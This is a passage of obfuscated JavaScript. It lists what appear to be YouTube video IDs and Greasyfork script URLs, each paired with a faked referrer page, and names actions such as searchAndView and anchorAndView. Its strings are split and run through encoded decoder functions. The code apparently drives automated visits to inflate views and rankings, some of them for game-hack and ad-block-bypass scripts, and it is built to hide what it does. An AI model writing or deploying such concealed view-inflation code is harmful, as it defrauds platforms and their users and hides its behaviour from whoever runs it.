    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    V(0x13, '%$RI') + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    X(0x9) + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    X(0x8) + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    W(0x1) + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    X(0x4) + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    X(0x7) + 'o',
    'pBx_5CbIcp' + 'o',
    W(0xb) + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    V(0x11, '[M7m') + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    W(0xc) + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': W(0x14) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + X(0x16) + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + V(0xa, 'Pqmd') + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': X(0x19) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + X(0x12),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
